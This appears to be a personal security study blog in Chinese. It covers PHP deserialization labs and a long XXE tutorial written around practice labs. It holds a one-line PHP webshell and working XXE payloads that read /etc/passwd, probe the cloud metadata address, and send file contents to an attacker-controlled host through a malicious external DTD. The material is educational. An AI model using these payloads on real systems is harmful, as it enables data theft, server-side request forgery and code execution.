<p><img src="D:\blog\H01iday\source_posts\pics\id13.png" alt="id13"></p>
<p><strong>重点来了！！</strong>分析__destruct()函数运行的这一行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="keyword">$this</span>-&gt;logFile, <span class="keyword">$this</span>-&gt;logData);</span><br></pre></td></tr></table></figure>

<p>记得test.php中建立的对象的属性值是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$logFile</span> = <span class="string">&quot;test.php&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$logData</span> = <span class="string">&#x27;&lt;?php system($_GET[&quot;hacker&quot;])?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>所以执行的内容就是将$logData的内容写到当前目录下的test.php文件中。【熟悉的一句话木马】</p>
<p>可以看到test.php文件中的内容已经被修改</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id14.png" alt="id14"></p>
<p>再向下的攻击就不展示了，最重点的是构造test.php中的app类，利用__destruct()函数</p>
<h3 id="003Lab-Arbitrary-object-injection-in-PHP"><a href="#003Lab-Arbitrary-object-injection-in-PHP" class="headerlink" title="##003Lab: Arbitrary object injection in PHP"></a>##003Lab: Arbitrary object injection in PHP</h3><p>已知：</p>
<p>​    credentials: <code>wiener:peter</code></p>
<p>目标：</p>
<p>​    inject a malicious serialized object to delete the <code>morale.txt</code> file from Carlos’s home directory. </p>
<p>首先，用给出的账号登录。在site map发现有一个php文件</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id15.png" alt="id15"></p>
<p>通过在后面添加~获取该文件的源码</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id16.png" alt="id15"></p>
<p>在源码中发现__destruct() 函数，且unlink删除lock_file_path路径下的文件</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id17.png" alt="id15"></p>
<p>那么可以想到，如果我们注入一个CustomTemplate的对象，将该对象的属性中lock_file_path的值设置为我们想要删除的文件的路径。即题目要求的文件路径，则可以成功实现</p>
<p>访问当前用户信息，得到一个session格式</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id18.png" alt="id18"></p>
<p>改写session为我们想进行注入的CustomTemplate的对象</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id19.png" alt="id19"></p>
<p>最终，指定路径文件被顺利删除</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id20.png" alt="id20"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/17/XXE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/17/XXE/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-10-17 13:12:24" itemprop="dateCreated datePublished" datetime="2021-10-17T13:12:24+08:00">2021-10-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-20 21:09:52" itemprop="dateModified" datetime="2021-10-20T21:09:52+08:00">2021-10-20</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="XXE-X-ML-E-x-ternal-E-ntity"><a href="#XXE-X-ML-E-x-ternal-E-ntity" class="headerlink" title="XXE(==X==ML E==x==ternal ==E==ntity)"></a>XXE(==X==ML E==x==ternal ==E==ntity)</h1><h2 id="1XML语法"><a href="#1XML语法" class="headerlink" title="#1XML语法"></a>#1XML语法</h2><h3 id="声明："><a href="#声明：" class="headerlink" title="声明："></a>声明：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>xml声明放在xml文档的第一行</li>
<li>standalone为文档定义是否独立使用 默认为no</li>
</ul>
<h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><ul>
<li>每个XML文档<strong>必须有</strong>且<strong>只有一个</strong>根元素</li>
<li>xml标签中的所有空格和换行，都会被当做标签内容进行处理。所以，在编写XML文件时，要特别注意。</li>
<li>命名规范：caseSensitive,不能以数字或下划线”_”开头，元素内不包含空格、冒号，可使用中文</li>
<li>不含标签体的节点表示：<code>&lt;a&gt;&lt;/a&gt;</code>,简写为:<code>&lt;a/&gt;</code></li>
</ul>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;元素名 属性名1=&quot;属性值1&quot; 属性名2=&quot;属性值2&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>可以用单引号/双引号</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--这是一个注释--&gt;</span><br></pre></td></tr></table></figure>

<h3 id="CDATA节"><a href="#CDATA节" class="headerlink" title="CDATA节"></a>CDATA节</h3><p>CADTA节中的所有内容不会被解析执行，完全当作原始内容，解释为纯文字。故出现&lt;、&gt;等都不会报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">    ......</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体的类型：</p>
<ol>
<li><p>Built-in entities</p>
<p>预定义实体。</p>
<p>如果在属性或者标签内使用如下的元素，要使用其实体表示。</p>
</li>
</ol>
<p><img src="D:\blog\H01iday\source_posts\pics\实体.jpg" alt="实体"></p>
<ol start="2">
<li>Character entities</li>
</ol>
<p>有的符号如&#169;很难或者不可能在键盘上打出来，就会用到字符实体。</p>
<p>例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding = &quot;UTF-8&quot; standalone = &quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">author</span>[</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ELEMENT <span class="meta-keyword">author</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">&quot;Tanmay patil&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">&quot;&amp;#169;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当该xml文件被执行在浏览器打开时，就会呈现Tanmay patil©，即&amp;#169;会被作为&#169;处理</p>
<ol start="3">
<li>General entities</li>
</ol>
<p>General entities must be declared within the DTD before they can be used within an XML document.</p>
<p>普通的可以看作是编程里面的定义变量</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">source-text</span> <span class="meta-string">&quot;tutorialspoint&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">//source-text为变量名  对应后面双引号中的内容为变量值</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">   &amp;source-text;</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>



<ol start="4">
<li>Parameter entities</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % ename &quot;entity_value&quot;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>==注意%和ename中间一定要有空格！==</li>
<li><em>entity_value</em> is any character that is not an <strong>==’&amp;’, ‘%’ or ‘ “ ‘.==</strong></li>
</ul>
<p>参数实体的目的是，建立一个reusable section。减少冗余。</p>
<p><strong>XML parameter entities are a special kind of XML entity which can only be referenced elsewhere ==within the DTD==.</strong> </p>
<p>参数实体不能在DTD子集内调用</p>
<p>举个栗子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">四个元素的声明，可以看出来冗余度非常高</span><br><span class="line">&lt;!ELEMENT residence (name, street, pincode, city, phone)&gt;</span><br><span class="line">&lt;!ELEMENT apartment (name, street, pincode, city, phone)&gt;</span><br><span class="line">&lt;!ELEMENT office (name, street, pincode, city, phone)&gt;</span><br><span class="line">&lt;!ELEMENT shop (name, street, pincode, city, phone)&gt;</span><br><span class="line"></span><br><span class="line">可以通过参数实体来减少冗余性</span><br><span class="line">&lt;!ENTITY % area &quot;name, street, pincode, city&quot;&gt;</span><br><span class="line">&lt;!ELEMENT residence (%area;)&gt;</span><br><span class="line">&lt;!ELEMENT apartment (%area)&gt;</span><br><span class="line">&lt;!ELEMENT office (%area;)&gt;</span><br><span class="line">&lt;!ELEMENT shop (%area)&gt;</span><br></pre></td></tr></table></figure>

<p>【==参数实体重要的知识点：==】</p>
<p>再内部DTD中参数实体不能写在实体声明内部，可以写在声明外。对于外部DTD，没有这个限制。</p>
<p>普通文本 实体。</p>
<p>内部实体声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">例：&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">下面通过&amp;write来引用这个实体的值</span><br></pre></td></tr></table></figure>

<p>相当于变量。实体名称即为变量名，实体的值即为变量的值。</p>
<p>外部实体声明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">例：&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">&lt;!DOCTYPE name PUBLIC &quot;-//Beginning XML//DTD Address Example//EN&quot;&gt;</span><br></pre></td></tr></table></figure>



<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><h4 id="内部dtd文档"><a href="#内部dtd文档" class="headerlink" title="内部dtd文档"></a>内部dtd文档</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span><br></pre></td></tr></table></figure>

<h4 id="外部dtd文档"><a href="#外部dtd文档" class="headerlink" title="外部dtd文档"></a>外部dtd文档</h4><p>1）引用本地文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>2）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;</span><br></pre></td></tr></table></figure>



<h4 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h4><h5 id="元素声明的语法"><a href="#元素声明的语法" class="headerlink" title="元素声明的语法"></a>元素声明的语法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 类别&gt;</span><br><span class="line">类别：EMPTY：表示该元素不能包含子元素和文本，但可以有属性。</span><br><span class="line">	  ANY：表示该元素可以包含任何在该DTD中定义的元素内容</span><br><span class="line">	 #PCDATA：与CDATA不同，#PCDATA指会被解析器解析的文本</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 (元素内容)&gt;</span><br><span class="line">&lt;!ELEMENT 元素名称 (子元素名称 1,子元素名称 2,.....)&gt;</span><br></pre></td></tr></table></figure>

<p>e.g：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body    (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>



<h5 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (message)&gt;</span><br><span class="line">》》message 子元素必须出现一次，并且必须只在 &quot;note&quot; 元素中出现一次。</span><br><span class="line">&lt;!ELEMENT note (message+)&gt;</span><br><span class="line">》》message 子元素必须在 &quot;note&quot; 元素内出现至少一次。</span><br><span class="line">&lt;!ELEMENT note (message*)&gt;</span><br><span class="line">》》子元素 message 可在 &quot;note&quot; 元素内出现零次或多次。</span><br><span class="line">&lt;!ELEMENT note (message?)&gt;</span><br><span class="line">》》子元素 message 可在 &quot;note&quot; 元素内出现零次或一次。</span><br></pre></td></tr></table></figure>





<h2 id="2XXE攻击类型"><a href="#2XXE攻击类型" class="headerlink" title="#2XXE攻击类型"></a>#2XXE攻击类型</h2><h3 id="retrieve-files"><a href="#retrieve-files" class="headerlink" title="retrieve files"></a>retrieve files</h3><h4 id="讲解："><a href="#讲解：" class="headerlink" title="讲解："></a>讲解：</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">productId</span>&gt;</span>381<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">//实体xxe中的内容为访问端/etc/passwd的内容。</span><br><span class="line">//通过引用&amp;xxe这样即可读出文件中的信息，达到retrieve files的目的</span><br></pre></td></tr></table></figure>

<h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>原本</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe1.png" alt="xxe1"></p>
<p>修改后</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe2.png" alt="image-20211018173710349"></p>
<h3 id="perform-SSRF-attacks"><a href="#perform-SSRF-attacks" class="headerlink" title="perform SSRF attacks"></a>perform SSRF attacks</h3><h4 id="讲解：-1"><a href="#讲解：-1" class="headerlink" title="讲解："></a>讲解：</h4><p>​    主要利用的是外部实体调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    由于服务器要去访问指定的URL来获得实体的value，所以可能通过此诱发SSRF漏洞</p>
<h4 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h4><p>已知，在<code>http://169.254.169.254/</code>可能存有敏感信息，stock checker含有XXE漏洞</p>
<p>这是首先点击check stock拦截到的请求报文</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe3.png" alt="xxe3"></p>
<p>如下，尝试进行SSRF攻击</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe4.png" alt="xxe3"></p>
<p>返回的内容得到文件名</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe5.png" alt="xxe5"></p>
<p>顺着该文件名访问下去</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe6.png" alt="xxe5"></p>
<p>得到再里面的一个文件名</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe7.png" alt="xxe5"></p>
<p>如此下去，得到敏感信息</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe8.png" alt="xxe5"></p>
<h2 id="Blind-XXE-vulnerabilities"><a href="#Blind-XXE-vulnerabilities" class="headerlink" title="Blind XXE vulnerabilities"></a>Blind XXE vulnerabilities</h2><p>盲XXE漏洞指应用不会返回任何外部实体的值。所以无法通过上面的方法直接获得服务器端的文件信息。</p>
<p>有以下两种方法：</p>
<h4 id="01exfiltrate-data-out-of-band"><a href="#01exfiltrate-data-out-of-band" class="headerlink" title="01exfiltrate data out-of-band"></a>01exfiltrate data out-of-band</h4><p>【利用Burp Collaborator】</p>
<p>其实就是说 我注入恶意XML代码，使服务器去访问Burp Collaborator的地址。</p>
<p>再通过查看Burp Collaborator的被访问记录。如果记录中有对应服务器的信息，那么就可以说明服务器真的有执行注入的XML代码。即使对客户端没有返回值也没关系。</p>
<p>说明了存在XXE漏洞</p>
<p>【前两部分都是讲 检测blind XXE；最后一部分exfiltrate data才是讲如何通过blind XXE获取敏感数据】</p>
<h5 id="regular-entitiy"><a href="#regular-entitiy" class="headerlink" title="regular entitiy"></a>regular entitiy</h5><p>原本的</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe9.png" alt="xxe9"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe10.png" alt="xxe9"></p>
<p>没有任何有用的返回信息</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe12.png" alt="xxe12"></p>
<p>在burp collaborator看到有接收到访问和请求的信息。</p>
<p>所以说明注入的XML代码又被执行，真的有去访问burp collaborator的地址。</p>
<p>所以说明含有XXE漏洞</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe11.png" alt="xxe9"></p>
<h5 id="parameter-entity"><a href="#parameter-entity" class="headerlink" title="parameter entity"></a>parameter entity</h5><p>当普通变量会被过滤的时候，考虑使用参数变量。</p>
<p>举个栗子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt;</span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\xxe13.png" alt="xxe13"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe14.png" alt="xxe13"></p>
<h5 id="exfiltrate-data"><a href="#exfiltrate-data" class="headerlink" title="exfiltrate data"></a>exfiltrate data</h5><p>上面的例子都是在说通过OAST方法可以证明存在盲XXE漏洞。</p>
<p>但是，重要的事情是如何通过这个漏洞获得敏感数据？</p>
<p>在盲【不返回任何外部实体内容】的情况下，如何能获取数据呢？</p>
<p>攻击者在自己的系统附有一个DTD文件，作为外部DTD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//malicious.dtd</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>

<p>首先定义一个变量file ,内容为/etc/passwd文件的内容</p>
<p>再定义了变量eval，内容为对变量exfiltrate的声明</p>
<p>调用%eval;实现对变量exfiltrate的声明</p>
<p>调用%exfiltrate;访问attacker的地址，携带%file的信息</p>
<p>攻击者submit the following XXE payload to the vulnerable application:        </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM</span><br><span class="line">&quot;http://web-attacker.com/malicious.dtd&quot;&gt; %xxe;]&gt; </span><br></pre></td></tr></table></figure>

<p>%xxe;会去请求外部DTD的信息。</p>
<p>【这里有两个点：①为什么要使用外部dtd  ②为什么要<code>&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://web-attacker.com/?x=%file;&#39;&gt;&quot;&gt;</code>这样写】</p>
<p>①内部DTD中参数实体不能写在实体声明内部，可以写在声明外。对于外部DTD，没有这个限制。</p>
<p>就是说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">%file;</span><br><span class="line">&lt;!ENTITY % exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;</span><br><span class="line">这是一个内部DTD，%file不能写在声明内部，即line3 x=%file那里</span><br><span class="line">但可以写在声明外即line2那样</span><br><span class="line"></span><br><span class="line">因为在外部DTD没有这个限制，所以想要在声明内部调用参数实体的话，可以使用外部DTD。</span><br></pre></td></tr></table></figure>

<p>②这个问题困扰了我一段时间，为什么要向payload1那样写，不像payload2那样写？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//payload1</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % exfil &quot;&lt;!ENTITY &amp;#x25; execute SYSTEM &#x27;http://b1dxnqcbx37l9vxu3zpqec4mfdl39s.burpcollaborator.net/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%exfil;</span><br><span class="line">%execute;</span><br><span class="line"></span><br><span class="line">//payload2</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;</span><br><span class="line">&lt;!ENTITY % execute SYSTEM &#x27;http://b1dxnqcbx37l9vxu3zpqec4mfdl39s.burpcollaborator.net/?x=%file;&#x27;&gt;</span><br><span class="line">%execute;</span><br></pre></td></tr></table></figure>

<p>payload1请求头信息为</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe19.png" alt="xxe19"></p>
<p>我尝试了一下payload2那样写发现提交给burpcollaborator.net即attacker的请求头信息为</p>
<p><img src="D:\blog\H01iday\source_posts\pics\xxe18.png" alt="xxe18"> </p>
<p>可以看到区别，payload2那样的会把<code>%file</code>当作一个字符串，而不会进行解析。所以可以看到payload1才能真正有效地将数据提交给attacker</p>
<h4 id="02retrieve-data-via-error-messages"><a href="#02retrieve-data-via-error-messages" class="headerlink" title="02retrieve data via error messages"></a>02retrieve data via error messages</h4><p>通过引起出错，报错内容包含敏感信息作为response，从报错信息中即可获取敏感数据</p>
<p>在attacker可以控制的系统中上传dtd文件作为外部dtd的来源【原理和上面说的一样】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;//注意%file;最后一定要加上分号</span><br><span class="line">%eval;</span><br><span class="line">%error; </span><br></pre></td></tr></table></figure>

<h5 id="例题：-2"><a href="#例题：-2" class="headerlink" title="例题："></a>例题：</h5><p>获取/etc/passwd文件的内容</p>
<p>在attacker控制的服务器上放置expliot.dtd文件作为外部dtd</p>
<img src="D:\blog\H01iday\source\_posts\pics\xxe20.png" alt="xxe20" style="zoom:80%;" />

<p>向靶机提交如下xml</p>
<img src="D:\blog\H01iday\source\_posts\pics\xxe21.png" alt="xxe20" style="zoom:80%;" />

<p>返回报错信息，包含敏感信息</p>
<img src="D:\blog\H01iday\source\_posts\pics\xxe22.png" alt="xxe20" style="zoom: 80%;" />



<h4 id="03Exploiting-blind-XXE-by-repurposing-a-local-DTD"><a href="#03Exploiting-blind-XXE-by-repurposing-a-local-DTD" class="headerlink" title="03Exploiting blind XXE by repurposing a local DTD"></a>03Exploiting blind XXE by repurposing a local DTD</h4><p>但out-of-band interactions are blocked的时候，上面的方法都不适用了。</p>
<p>①不能建立out-of-band connection【不能用burp collaborator】</p>
<p>②不能load an external DTD from a remote server.       </p>
<p>这种情况怎么办呢?</p>
<p>利用XML的规范漏洞， trigger error messages containing sensitive data</p>
<p>具体是什么漏洞？</p>
<p> If a document’s DTD uses a hybrid of internal and external DTD  declarations, then the internal DTD can redefine entities that are  declared in the external DTD. </p>
<p>【既然out-of-band interactions are blocked，那么这里所说的external DTD应该要存储在本机的filesystem中】</p>
